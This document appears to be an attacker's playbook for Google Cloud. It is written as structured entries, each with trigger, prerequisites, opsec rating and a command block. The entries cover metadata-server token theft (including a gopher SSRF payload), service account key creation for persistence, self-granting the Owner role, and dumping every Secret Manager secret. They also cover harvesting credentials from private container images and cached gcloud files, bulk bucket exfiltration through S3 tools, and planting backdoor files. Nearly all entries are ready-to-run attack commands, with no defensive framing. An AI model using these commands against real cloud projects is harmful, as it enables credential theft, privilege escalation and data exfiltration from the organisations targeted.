# Cloud – GCP Attacks

### GCP Metadata Server SSRF — Service Account Token Theft [added: 2026-04]
- **Tags:** #GCP #MetadataServer #SSRF #ServiceAccount #TokenTheft #ComputeEngine #CloudFunction #CloudCredTheft
- **Trigger:** Found SSRF vulnerability in a GCP-hosted application or have shell on a Compute Engine VM / Cloud Function / Cloud Run container
- **Prereq:** SSRF vulnerability or shell access on GCP resource + metadata server (169.254.169.254) reachable + `Metadata-Flavor: Google` header injectable (or shell access)
- **Yields:** OAuth2 access token for the attached service account, usable for GCP API calls with all roles granted to that SA
- **Opsec:** Low
- **Context:** GCP metadata server requires the `Metadata-Flavor: Google` header (unlike AWS IMDSv1). From shell access this is trivial. Via SSRF, you need header injection capability. The token grants access to all GCP APIs the service account is authorized for.
- **Payload/Method:**
  ```bash
  # From shell — get access token for the default service account
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq .

  # Enumerate the service account email
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

  # List all scopes the SA has
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

  # Get project ID
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/project/project-id"

  # Check for custom metadata (startup scripts often contain secrets)
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true"

  # Use stolen token with gcloud
  gcloud auth activate-service-account --access-token="<STOLEN_TOKEN>"
  # Or use directly with curl
  curl -s -H "Authorization: Bearer <STOLEN_TOKEN>" \
    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .
  ```

### GCP Service Account Key Creation — Persistent Access [added: 2026-04]
- **Tags:** #GCP #ServiceAccountKey #IAM #PersistentAccess #PrivEsc #Backdoor #KeyCreation #ServiceAccount
- **Trigger:** Compromised GCP identity has `iam.serviceAccountKeys.create` permission on a high-privilege service account
- **Prereq:** Authenticated GCP session (gcloud or API) + `iam.serviceAccountKeys.create` permission on the target service account
- **Yields:** Downloaded JSON key file for the target service account — persistent credential that works until deleted, no token expiry
- **Opsec:** High
- **Context:** Service account keys are long-lived credentials (no automatic expiry). If you can create a key for a highly privileged SA, you get persistent access that survives token revocations and password resets. This is a common persistence and privilege escalation technique.
- **Payload/Method:**
  ```bash
  # List all service accounts in the project
  gcloud iam service-accounts list --project <PROJECT_ID>

  # Check IAM policy to find high-privilege SAs
  gcloud projects get-iam-policy <PROJECT_ID> --format=json \
    | jq '.bindings[] | select(.role | test("owner|admin|editor"; "i"))'

  # Create a new key for the target service account
  gcloud iam service-accounts keys create ./sa-key.json \
    --iam-account=<TARGET_SA_EMAIL> \
    --project=<PROJECT_ID>

  # Authenticate with the stolen key
  gcloud auth activate-service-account --key-file=./sa-key.json

  # Verify access
  gcloud projects list
  gcloud compute instances list --project <PROJECT_ID>

  # Or use via API directly
  export GOOGLE_APPLICATION_CREDENTIALS=./sa-key.json
  curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq .

  # Cleanup note: list keys to avoid detection
  gcloud iam service-accounts keys list --iam-account=<TARGET_SA_EMAIL>
  ```

### GCP Default Service Account Abuse — Editor Privesc from Compromised VM [added: 2026-04]
- **Tags:** #GCP #DefaultServiceAccount #ComputeEngine #Editor #PrivEsc #LateralMovement #ProjectEditor #VMEscape
- **Trigger:** Compromised a GCP Compute Engine VM and the default service account has the Editor role (common misconfiguration)
- **Prereq:** Shell on a Compute Engine VM + default service account attached + Editor role granted (or broad scopes like `cloud-platform`)
- **Yields:** Project-wide Editor access — read/write to Compute, Storage, BigQuery, Pub/Sub, and most GCP services in the project
- **Opsec:** Med
- **Context:** GCP Compute Engine VMs created with default settings often get the default compute service account with Editor role. Editor can read/write almost everything in the project. From a compromised VM, use the metadata token to pivot across the entire project.
- **Payload/Method:**
  ```bash
  # Confirm you're on a GCP VM with the default SA
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
  # Look for: <PROJECT_NUMBER>-compute@developer.gserviceaccount.com

  # Check scopes (need cloud-platform or broad scopes)
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

  # Get access token and authenticate gcloud
  ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq -r .access_token)

  # Enumerate the project with Editor permissions
  gcloud compute instances list --project <PROJECT_ID>
  gcloud storage ls
  gcloud sql instances list --project <PROJECT_ID>
  gcloud secrets list --project <PROJECT_ID>

  # Read secrets (Editor has secretmanager.versions.access on many setups)
  gcloud secrets versions access latest --secret=<SECRET_NAME> --project <PROJECT_ID>

  # List and download storage buckets
  gsutil ls gs://<BUCKET_NAME>/
  gsutil cp gs://<BUCKET_NAME>/sensitive-file.txt ./

  # SSH to other VMs in the project (Editor can set SSH keys via metadata)
  gcloud compute ssh <OTHER_VM> --zone <ZONE> --project <PROJECT_ID>
  ```

### GCP IAM Policy Binding Escalation — Self-Grant Owner [added: 2026-04]
- **Tags:** #GCP #IAM #PolicyBinding #PrivEsc #setIamPolicy #Owner #ProjectTakeover #RoleBinding #ResourceManager
- **Trigger:** Compromised GCP identity has `resourcemanager.projects.setIamPolicy` or `setIamPolicy` on a folder/org and want to escalate to Owner
- **Prereq:** Authenticated GCP session + `resourcemanager.projects.setIamPolicy` (or equivalent at folder/org level) + knowledge of your own member identity (user/SA email)
- **Yields:** Owner role on the GCP project/folder/org, granting full administrative control over all resources
- **Opsec:** High
- **Context:** The `setIamPolicy` permission allows overwriting the entire IAM policy for a resource. This is the GCP equivalent of Azure User Access Administrator escalation. If any identity has this permission, it can grant itself (or any other identity) the Owner role.
- **Payload/Method:**
  ```bash
  # Check if current identity can set IAM policy
  # (no direct "test" — try to get the policy first)
  gcloud projects get-iam-policy <PROJECT_ID> --format=json > policy.json

  # Examine current policy
  cat policy.json | jq '.bindings[] | select(.role == "roles/owner")'

  # Add yourself as Owner — edit policy.json to add a new binding
  # Add this to the bindings array:
  # {"role": "roles/owner", "members": ["user:<YOUR_EMAIL>"]}
  
  # Using jq to modify the policy programmatically
  jq '.bindings += [{"role": "roles/owner", "members": ["serviceAccount:<YOUR_SA_EMAIL>"]}]' \
    policy.json > policy_modified.json

  # Apply the modified policy
  gcloud projects set-iam-policy <PROJECT_ID> policy_modified.json

  # Alternatively via REST API
  curl -s -X POST \
    -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    -H "Content-Type: application/json" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/<PROJECT_ID>:setIamPolicy" \
    -d "{\"policy\": $(cat policy_modified.json)}"

  # Verify escalation
  gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
    --filter="bindings.members:<YOUR_SA_EMAIL>" --format="table(bindings.role)"
  ```

### GCP Artifact Registry — Private Docker Image Enumeration & Extraction [added: 2026-05]
- **Tags:** #GCP #ArtifactRegistry #Docker #ImageExtraction #ContainerRegistryEnum #PrivateImages #ServiceAccount #CredPrivEsc
- **Trigger:** Compromised GCP service account has `artifactregistry.repositories.list` or `storage.buckets.list` permissions, or shell on GCP resource
- **Prereq:** Authenticated gcloud session or stolen service account JSON + `artifactregistry.repositories.list` / `artifactregistry.files.list` permissions + gcloud CLI or docker CLI
- **Yields:** Access to private Docker images, potential source code, embedded credentials, keys, or environment variables hardcoded in Dockerfiles or application files
- **Opsec:** Med
- **Context:** GCP Artifact Registry stores private Docker images, Python packages, and other artifacts. If a service account has `artifactregistry` permissions, you can enumerate and pull private images. Images often contain hardcoded credentials, configuration files, or API keys left over from development. Container filesystems can be inspected after pulling.
- **Payload/Method:**
  ```bash
  # Authenticate with stolen service account key
  gcloud auth activate-service-account --key-file=sa-key.json
  gcloud config set project <PROJECT_ID>

  # List all Artifact Registry repositories
  gcloud artifacts repositories list --location=us-central1

  # List all Docker images in a specific repository
  gcloud artifacts docker images list us-central1-docker.pkg.dev/<PROJECT_ID>/<REPO_NAME>/
  
  # Get detailed image info (tags, digests, creation date)
  gcloud artifacts docker images describe \
    us-central1-docker.pkg.dev/<PROJECT_ID>/<REPO_NAME>/<IMAGE_NAME>:latest \
    --format=json | jq .

  # Authenticate Docker CLI with gcloud
  gcloud auth configure-docker us-central1-docker.pkg.dev

  # Pull the private image
  docker pull us-central1-docker.pkg.dev/<PROJECT_ID>/<REPO_NAME>/<IMAGE_NAME>:latest

  # Extract filesystem from the image (inspect without running)
  docker save us-central1-docker.pkg.dev/<PROJECT_ID>/<REPO_NAME>/<IMAGE_NAME>:latest | tar -xf - -C /tmp/extracted_image

  # Or run the image interactively and explore the filesystem
  docker run -it --entrypoint /bin/sh us-central1-docker.pkg.dev/<PROJECT_ID>/<REPO_NAME>/<IMAGE_NAME>:latest
  # Once inside: find /app /root /home -name "*.json" -o -name "*.key" -o -name "*.pem" -o -name ".env"
  # Check for hardcoded credentials in application source, config files, and environment
  env | grep -i key,secret,password,token
  cat /app/.env
  grep -r "apiKey\|password\|secret" /app/

  # Extract all layers and search for credentials
  for layer in /tmp/extracted_image/*/layer.tar; do
    tar -xf "$layer" -C /tmp/image_fs/ 2>/dev/null
  done
  grep -r "AWS_SECRET\|GCP_KEY\|API_KEY" /tmp/image_fs/ 2>/dev/null
  ```

### GCS-to-S3 Interoperability — Access Private GCS Buckets via S3 Tools [added: 2026-05]
- **Tags:** #GCP #GCS #S3 #GoogleCloudStorage #Interoperability #S3cmd #StorageAccess #BucketEnum #CredPivot
- **Trigger:** Have HMAC credentials for a GCS service account and want to enumerate/exfil data using S3 tools (s3cmd, aws cli with custom endpoint)
- **Prereq:** GCS service account HMAC credentials (access_key_id and secret_key) obtained via `gcloud storage buckets get-iam-policy` or from compromised config
- **Yields:** Full read/write access to GCS buckets using S3-compatible tools, avoiding gcloud CLI which may be monitored or restricted
- **Opsec:** Low
- **Context:** GCP offers S3-compatible interoperability for Cloud Storage via HMAC credentials. This allows any S3 tool (s3cmd, aws-cli, boto3, etc.) to access GCS buckets. Useful for exfiltration when gcloud is unavailable, for obfuscation, or when S3 tools are already present on a compromised system. The bucket names and credentials are identical — just change the endpoint.
- **Payload/Method:**
  ```bash
  # Method 1: Generate HMAC credentials for a service account (requires storage admin access)
  gcloud storage service-accounts list
  SA_EMAIL=$(gcloud storage service-accounts list --format="value(email)" | head -1)
  gcloud storage hmacs create $SA_EMAIL

  # Method 2: If you already have HMAC credentials, configure s3cmd
  s3cmd --configure  # When prompted:
  # Access Key: <GCS_HMAC_ACCESS_KEY>
  # Secret Key: <GCS_HMAC_SECRET_KEY>
  # Default Region: us
  # S3 Endpoint: storage.googleapis.com
  # DNS-style bucket+hostname [%(bucket)s.s3.amazonaws.com]: %(bucket)s.storage.googleapis.com
  # Encryption password: (leave blank or set)
  # Path to gpg program: (leave default)
  # Use HTTPS [Yes]: Yes
  # Test connection: Yes

  # Or create a config file directly
  cat > ~/.s3cfg <<EOF
  [default]
  access_key = <GCS_HMAC_ACCESS_KEY>
  secret_key = <GCS_HMAC_SECRET_KEY>
  host_base = storage.googleapis.com
  host_bucket = %(bucket)s.storage.googleapis.com
  use_https = True
  EOF

  # List all GCS buckets using s3cmd
  s3cmd ls

  # List contents of a specific bucket
  s3cmd ls s3://<BUCKET_NAME>/

  # Download files from a bucket
  s3cmd get s3://<BUCKET_NAME>/sensitive-file.txt ./

  # Alternative: Use aws-cli with custom endpoint
  aws s3 ls s3://<BUCKET_NAME>/ \
    --endpoint-url https://storage.googleapis.com \
    --access-key <GCS_HMAC_ACCESS_KEY> \
    --secret-access-key <GCS_HMAC_SECRET_KEY>

  # Recursive download of entire bucket
  aws s3 sync s3://<BUCKET_NAME>/ ./local-copy \
    --endpoint-url https://storage.googleapis.com \
    --access-key <GCS_HMAC_ACCESS_KEY> \
    --secret-access-key <GCS_HMAC_SECRET_KEY>

  # Upload files back (for persistence or data injection)
  s3cmd put ./backdoor.txt s3://<BUCKET_NAME>/backdoor.txt
  ```

### GCP Service Account Permission Bruteforcing & Enumeration [added: 2026-05]
- **Tags:** #GCP #ServiceAccount #PermissionEnumeration #Bruteforce #IAM #Reconnaissance #PrivEsc #gcloud
- **Trigger:** Compromised a GCP service account JSON key or have access to `gcloud` CLI with a service account authenticated; need to determine what permissions/resources the SA can access
- **Prereq:** Service account JSON key file OR `gcloud` authenticated session as a service account
- **Yields:** Enumeration of SA's effective permissions; discovery of high-value resources the SA can access (Compute instances, Secrets Manager, IAM policies, Storage)
- **Opsec:** Med
- **Context:** After stealing a service account key, don't assume permissions blindly. Use targeted gcloud commands to enumerate compute instances, secrets, and IAM policies. Many SAs are granted broad scopes or overprivileged roles.
- **Payload/Method:**
  ```bash
  # Activate the compromised service account
  gcloud auth activate-service-account --key-file=service-account.json
  
  # List all compute instances in the project (common)
  gcloud compute instances list
  
  # Describe a specific instance to extract metadata (often contains creds/scripts)
  gcloud compute instances describe <INSTANCE_NAME> --zone <ZONE>
  
  # Try to list secrets (if Secrets Manager access granted)
  gcloud secrets list
  
  # Get a specific secret (WebAdminPassword, etc.)
  gcloud secrets versions access latest --secret=<SECRET_NAME>
  
  # Enumerate IAM policy to find users and other SAs
  gcloud projects get-iam-policy <PROJECT_ID>
  
  # If compute permissions exist, check service accounts on instances
  gcloud compute instances list --format="table(name, zone, serviceAccounts[].email)"
  ```

### GCP VM Metadata Credential Extraction [added: 2026-05]
- **Tags:** #GCP #VM #Metadata #CredentialExtraction #ComputeEngine #PlaintextCreds #ServiceAccount #gcloud
- **Trigger:** SSH/shell access on a GCP Compute Engine VM; enumerated `~/.config/gcloud/` directory
- **Prereq:** Interactive shell on a GCP VM + `gcloud` CLI installed + user home directory readable
- **Yields:** Cached service account credentials (application_default_credentials.json, adc.json, or user-specific SA keys) for lateral movement
- **Opsec:** Low
- **Context:** GCP VMs often have gcloud config cached in user home (~/.config/gcloud/). If a developer or automation account logged in previously, their service account keys or OAuth tokens may be stored in plaintext.
- **Payload/Method:**
  ```bash
  # On the compromised VM, enumerate gcloud config
  ls -la ~/.config/gcloud/
  
  # Look for credentials files
  cat ~/.config/gcloud/application_default_credentials.json
  cat ~/.config/gcloud/adc.json
  
  # Dump all gcloud configs
  gcloud config list
  
  # Check for SSH keys or other credentials
  ls -la ~/.ssh/
  cat ~/.ssh/*
  
  # Extract any service account JSON keys
  find ~ -name "*.json" -type f 2>/dev/null | xargs grep -l "private_key" 2>/dev/null
  
  # Exfil discovered SA credentials and bruteforce permissions on them
  ```

### GCP Secrets Manager Access via Service Account [added: 2026-05]
- **Tags:** #GCP #SecretsManager #ServiceAccount #CredentialTheft #IAM #LateralMovement #Passwords #PrivEsc
- **Trigger:** Compromised service account has `secretmanager.secretAccessor` or `secretmanager.viewer` role; need to harvest passwords or API keys
- **Prereq:** gcloud authenticated as a service account with Secrets Manager access
- **Yields:** Plaintext application passwords, API keys, SSH keys, or other secrets stored in GCP Secrets Manager
- **Opsec:** Low
- **Context:** Many teams store application passwords (e.g., WebAdminPassword, database credentials) in Secrets Manager. If a lateral-movement SA has access, it's a direct path to application-level compromise.
- **Payload/Method:**
  ```bash
  # List all secrets accessible to this SA
  gcloud secrets list --format="table(name, created)"
  
  # Get the latest version of a specific secret
  gcloud secrets versions access latest --secret=<SECRET_NAME>
  
  # Example: retrieve web admin password
  gcloud secrets versions access latest --secret=WebAdminPassword
  
  # Loop through all secrets and dump them
  for secret in $(gcloud secrets list --format="value(name)"); do
    echo "=== $secret ==="
    gcloud secrets versions access latest --secret=$secret 2>/dev/null || echo "Access denied"
  done
  ```

### GCP IAM Policy Enumeration for User Discovery [added: 2026-05]
- **Tags:** #GCP #IAM #UserEnumeration #Reconnaissance #Enumeration #PrivEsc #ProjectPolicy
- **Trigger:** Compromised service account; need to identify users with access to the project for targeting or credential spraying
- **Prereq:** gcloud authenticated as a service account with IAM read permissions (common)
- **Yields:** List of IAM members (users, service accounts, groups) and their roles
- **Opsec:** Low
- **Context:** `gcloud projects get-iam-policy` reveals all users with project access. Extract usernames (user@domain.com) to build wordlists for spraying or targeting.
- **Payload/Method:**
  ```bash
  # Get full IAM policy
  gcloud projects get-iam-policy <PROJECT_ID>
  
  # Extract just member emails
  gcloud projects get-iam-policy <PROJECT_ID> --format=json | jq '.bindings[].members[]' | sort -u
  
  # Build a username wordlist (strip domain)
  gcloud projects get-iam-policy <PROJECT_ID> --format=json | jq '.bindings[].members[]' | sed 's/@.*//' | sort -u
  ```

### GCP Metadata Server SSRF — Gopher Protocol Header Injection Bypass [added: 2026-05]
- **Tags:** #GCP #MetadataServer #SSRF #GopherProtocol #HeaderInjection #BypassTechnique #TokenTheft #ProtocolEscalation
- **Trigger:** Found SSRF vulnerability in a GCP-hosted web app that sanitizes HTTP headers or blocks direct `Metadata-Flavor: Google` header injection; metadata server (169.254.169.254) reachable via SSRF
- **Prereq:** SSRF vulnerability in web app + GCP metadata server reachable + HTTP header injection filtering active (but not filtering URL protocols)
- **Yields:** OAuth2 access token for the attached GCP service account (bypassing Metadata-Flavor header requirement)
- **Opsec:** Low
- **Context:** GCP metadata requires the `Metadata-Flavor: Google` header for security. Direct header injection may be blocked by the web app's sanitization. Gopher protocol embeds HTTP headers within the URL scheme itself, bypassing header filters and allowing header injection through the SSRF payload. The gopher URL encodes headers in the path (headers follow a `%0A` newline separator), tricking the metadata server into accepting the request.
- **Payload/Method:**
  ```bash
  # Gopher protocol SSRF payload — embeds Metadata-Flavor header in URL
  # Encodes: GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
  #          Host: metadata.google.internal
  #          Metadata-Flavor: Google
  
  gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AMetadata-Flavor:%20Google%0A%0A
  
  # URL-decoded for clarity (do not use directly):
  # gopher://metadata.google.internal:80/x
  # GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1\r\n
  # Host: metadata.google.internal\r\n
  # Metadata-Flavor: Google\r\n
  # \r\n
  
  # Or use via SSRF in a web form (e.g., feed parameter):
  # Submit this URL in the vulnerable parameter:
  # gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AMetadata-Flavor:%20Google%0A%0A
  
  # Extract the token from the response (look for "access_token" field in JSON)
  # Use the token with gcloud:
  gcloud auth activate-service-account --access-token="<STOLEN_TOKEN>"
  ```

### GCP IAM testIamPermissions API — Service Account Permission Enumeration [added: 2026-05]
- **Tags:** #GCP #IAM #testIamPermissions #ServiceAccount #PermissionEnumeration #TargetedPrivEsc #LateralMovement #TokenMinting
- **Trigger:** Compromised a GCP service account and need to identify abusable permissions (e.g., `iam.serviceAccounts.getAccessToken`) on other service accounts; already know target SA email
- **Prereq:** Compromised service account with authentication (key or token); target service account email known (from Compute instance enum, Cloud Run, GCP project policy, etc.)
- **Yields:** List of permissions the compromised SA has on the target SA (often includes dangerous ones like `iam.serviceAccounts.getAccessToken` or `iam.serviceAccountKeys.create`); enables targeted lateral movement
- **Opsec:** Med
- **Context:** `testIamPermissions` is an IAM API that asks GCP "which of these permissions do I (the caller) have on this resource?" It's much faster than trying each permission individually and avoids over-logging. Many service accounts with Editor role or broad IAM permissions can generate new access tokens for other SAs, escalating laterally without needing to extract keys. The API returns only the permissions the caller actually has, enabling precise exploitation.
- **Payload/Method:**
  ```bash
  # Authenticate as the compromised service account
  gcloud auth activate-service-account --key-file=compromised-sa.json --project=<PROJECT_ID>
  
  # List all service accounts to find targets
  gcloud iam service-accounts list
  
  # Query which permissions the compromised SA has on a target SA
  # Key permission to look for: iam.serviceAccounts.getAccessToken
  gcloud iam service-accounts test-iam-permissions \
    <TARGET_SA_EMAIL> \
    --permissions=iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create,iam.serviceAccounts.implicitDelegation
  
  # If getAccessToken is granted, mint a new access token for the target SA:
  gcloud iam service-accounts get-access-token \
    <TARGET_SA_EMAIL> \
    --project=<PROJECT_ID>
  
  # Use the minted token for lateral movement (may have higher permissions)
  gcloud auth activate-service-account --access-token="<MINTED_TOKEN>"
  
  # Verify escalation by listing resources accessible from the new SA
  gcloud compute instances list --project=<PROJECT_ID>
  gcloud secrets list --project=<PROJECT_ID>
  ```

